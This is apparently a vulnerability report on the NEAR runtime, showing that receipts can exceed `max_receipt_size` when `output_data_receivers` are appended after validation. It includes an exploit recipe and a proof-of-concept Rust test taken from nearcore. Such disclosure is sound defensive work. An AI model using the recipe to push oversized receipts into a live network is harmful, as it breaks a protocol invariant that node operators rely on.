### Title
Receipt `max_receipt_size` Limit Bypassed via Post-Validation `output_data_receivers` Append - (File: `runtime/runtime/src/lib.rs`)

### Summary
The NEAR runtime validates new receipts against `max_receipt_size` at creation time, but then unconditionally appends `output_data_receivers` to a receipt **after** that validation when a contract uses `promise_return`. This allows any unprivileged user to craft a promise DAG that produces a receipt exceeding `max_receipt_size` that is forwarded into the protocol without re-validation, violating the receipt size invariant.

### Finding Description
When a function call executes and returns `ReturnData::ReceiptIndex` (i.e., `promise_return`), the runtime in `apply_action_receipt` appends the parent receipt's `output_data_receivers` directly onto the newly created child receipt: [1](#0-0) 

This mutation happens **after** the receipt was already validated by `validate_receipt` with `ValidateReceiptMode::NewReceipt`: [2](#0-1) 

The size check in `validate_receipt` measures the receipt's borsh-serialized size at the moment of creation. Once `output_data_receivers` are appended post-validation, the receipt's actual size grows beyond `max_receipt_size` with no re-check. The bug is explicitly acknowledged in the codebase: [3](#0-2) 

The `ValidateReceiptMode::ExistingReceipt` mode was introduced specifically to tolerate these already-oversized receipts that have entered the protocol, confirming the invariant is broken at the protocol level.

The test `test_max_receipt_size_promise_return` documents the exact exploit scenario and confirms the oversized receipt is forwarded: [4](#0-3) [5](#0-4) 

A parallel bug exists for data receipts via `value_return` (issue #12606): [6](#0-5) 

### Impact Explanation
The `max_receipt_size` limit is a protocol-level invariant enforced to bound memory consumption during receipt processing and to ensure consistent behavior across all nodes. When a receipt exceeds this limit and is forwarded into the network:

1. **Protocol invariant violation**: The receipt that enters the outgoing receipt queue and is forwarded to other shards violates the `max_receipt_size` constraint. The receiving shard processes it under `ValidateReceiptMode::ExistingReceipt` (less strict), meaning the invariant is silently broken.
2. **Corrupted receipt value**: The concrete corrupted protocol value is the receipt itself — its borsh-serialized size exceeds `max_receipt_size` (e.g., 4,194,304 bytes) yet it is stored in the DB and forwarded as a valid outgoing receipt.
3. **Potential consensus divergence**: If future protocol versions or nodes handle oversized receipts differently (e.g., reject them), nodes that have already accepted and stored the oversized receipt will diverge.

### Likelihood Explanation
Any unprivileged user who can deploy a contract can trigger this. The exploit requires:
1. Deploy a contract with a method that creates a promise DAG `[A -then-> B]`
2. When A executes, create a new receipt C sized exactly at `max_receipt_size` and call `promise_return(C)`
3. The runtime appends B's `output_data_receivers` to C, pushing it over the limit

This is a straightforward, deterministic exploit requiring only a signed transaction and a deployed contract. No validator or privileged access is needed.

### Recommendation
After `output_data_receivers` are appended to the returned receipt (the `promise_return` path in `apply_action_receipt`), re-validate the receipt size before forwarding it:

```rust
// After extending output_data_receivers, re-check size
let receipt_size = borsh::object_length(&new_receipt).unwrap() as u64;
if receipt_size > limit_config.max_receipt_size {
    // treat as validation error / abort the action
}
```

Alternatively, account for the size of the parent's `output_data_receivers` when validating the child receipt at creation time, so the combined size never exceeds the limit.

### Proof of Concept
The nearcore test suite already contains a working proof of concept: [7](#0-6) 

The test:
1. Deploys a contract
2. Calls `max_receipt_size_promise_return_method1` with `args_size = max_receipt_size - base_receipt_size`, creating a receipt C exactly at the limit
3. The promise DAG `[C ->then-> B]` causes the runtime to append B's `output_data_receivers` to C
4. `assert_oversized_receipt_occurred` confirms the oversized receipt was forwarded into the protocol

fn test_max_receipt_size_promise_return() {
    init_test_logger();

    let account = create_account_id("account0");
    let account_signer = create_user_test_signer(&account);
    let mut env = TestLoopBuilder::new()
        .enable_rpc()
        .add_user_account(&account, Balance::from_near(10_000))
        .build();

    // Deploy the test contract
    let deploy_contract_tx = SignedTransaction::deploy_contract(
        101,
        &account,
        near_test_contracts::rs_contract().into(),
        &account_signer,
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(deploy_contract_tx, Duration::seconds(5));

    // User calls a contract method
    // Contract method creates a DAG with two promises: [A -then-> B]
    // When promise A is executed, it creates a third promise - `C` and does a `promise_return`.
    // The DAG changes to: [C ->then-> B]
    // The receipt for promise C is a maximum size receipt.
    // Adding the `output_data_receivers` to C's receipt makes it go over the size limit.
    let base_receipt_template = Receipt::V0(ReceiptV0 {
        predecessor_id: account.clone(),
        receiver_id: account.clone(),
        receipt_id: CryptoHash::default(),
        receipt: ReceiptEnum::Action(ActionReceipt {
            signer_id: account.clone(),
            signer_public_key: account_signer.public_key().into(),
            gas_price: Balance::ZERO,
            output_data_receivers: vec![],
            input_data_ids: vec![],
            actions: vec![Action::FunctionCall(Box::new(FunctionCallAction {
                method_name: "noop".into(),
                args: vec![],
                gas: Gas::ZERO,
                deposit: Balance::ZERO,
            }))],
        }),
    });
    let base_receipt_template = action_receipt_v1_to_latest(&base_receipt_template);
    let base_receipt_size = borsh::object_length(&base_receipt_template).unwrap();
    let max_receipt_size = 4_194_304;
    let args_size = max_receipt_size - base_receipt_size;

    // Call the contract
    let large_receipt_tx = SignedTransaction::call(
        102,
        account.clone(),
        account.clone(),
        &account_signer,
        Balance::ZERO,
        "max_receipt_size_promise_return_method1".into(),
        format!("{{\"args_size\": {}}}", args_size).into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(large_receipt_tx, Duration::seconds(5));

    // Make sure that the last promise in the DAG was called
    let assert_test_completed = SignedTransaction::call(
        103,
        account.clone(),
        account,
        &account_signer,
        Balance::ZERO,
        "assert_test_completed".into(),
        "".into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(assert_test_completed, Duration::seconds(5));

    assert_oversized_receipt_occurred(&env.validator());
}
